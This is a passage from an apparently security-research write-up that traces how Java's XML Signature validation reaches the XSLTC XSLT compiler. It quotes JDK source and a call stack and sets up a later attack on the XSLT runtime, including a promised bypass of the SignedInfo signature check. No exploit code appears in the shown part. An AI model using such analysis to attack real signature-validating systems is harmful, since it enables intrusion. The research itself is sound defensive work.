sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">}</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">[..]</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">}</span></p></td></tr></tbody></table></div><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">As we can see, the </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">validate</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> method first validates the signature of the </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">SignedInfo</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> element in (A) before validating all the references in (B).&nbsp; This means that an attack against the XSLT runtime will require a valid signature for the </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">SignedInfo</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> element and well discuss later how an attacker can bypass this requirement.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">The call to </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">ref.validate()</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> in (B) ends up in the </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">DomReference.validate</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> method shown below:</span></p><div align="left" dir="ltr" style="margin-left: 0pt;"><table style="border-collapse: collapse; border: none;"><colgroup></colgroup><tbody><tr style="height: 0pt;"><td style="background-color: #fafafa; border-bottom: solid #e0e0e0 1pt; border-left: solid #e0e0e0 1pt; border-right: solid #e0e0e0 1pt; border-top: solid #e0e0e0 1pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">public</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">boolean</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> validate</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">(</span><span style="background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">XMLValidateContext</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> validateContext</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">)</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">throws</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">XMLSignatureException</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">{</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">if</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">(</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">validateContext </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">==</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">null</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">)</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">{</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">throw</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">new</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">NullPointerException</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">(</span><span style="background-color: transparent; color: #0f9d58; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">"validateContext cannot be null"</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">);</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">}</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">if</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">(</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">validated</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">)</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">{</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">return</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> validationStatus</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">}</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Data</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> data </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> dereference</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">(</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">validateContext</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">);</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">(</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">D</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">)</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;calcDigestValue </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> transform</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">(</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">data</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">,</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> validateContext</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">);</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">(</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">E</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">)</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">[..]</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;validationStatus </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Arrays</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">.</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">equals</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">(</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">digestValue</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">,</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> calcDigestValue</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">);</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">(</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">F</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">)</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;validated </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">true</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">return</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> validationStatus</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">}</span></p><br /><br /></td></tr></tbody></table></div><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">The code gets the referenced data in (D), transforms it in (E) and compares the digest of the result with the digest stored in the signature in (F). Most of the complexity is hidden behind the call to </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">transform</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> in (E) which loops through all Transform elements defined in the Reference and executes them.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">As this is Java, we have to walk through a lot of indirection layers before we end up at the interesting parts. Take a look at the call stack below if you want to follow along and step through the code:</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Courier New, sans-serif; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:584) at com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl.newTransformer(TransformerFactoryImpl.java:818) at com.sun.org.apache.xml.internal.security.transforms.implementations.TransformXSLT.enginePerformTransform(TransformXSLT.java:130) at com.sun.org.apache.xml.internal.security.transforms.Transform.performTransform(Transform.java:316) at org.jcp.xml.dsig.internal.dom.ApacheTransform.transformIt(ApacheTransform.java:188) at org.jcp.xml.dsig.internal.dom.ApacheTransform.transform(ApacheTransform.java:124) at org.jcp.xml.dsig.internal.dom.DOMTransform.transform(DOMTransform.java:173) at org.jcp.xml.dsig.internal.dom.DOMReference.transform(DOMReference.java:457) at org.jcp.xml.dsig.internal.dom.DOMReference.validate(DOMReference.java:387) at org.jcp.xml.dsig.internal.dom.DOMXMLSignature.validate(DOMXMLSignature.java:281)</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">If we specify a XSLT transform and the </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">org.jcp.xml.dsig.secureValidation</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> property isn't enabled (well come back to this later) we will end up in the file </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">src/java.xml/share/classes/com/sun/org/apache/xalan/internal/xsltc/trax/TransformerFactoryImpl.java</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> which is part of a module called XSLTC.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">XSLTC, the XSLT compiler, is originally part of the </span><a href="https://xalan.apache.org/" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">Apache Xalan</span></a><span style="font-family: Arial; 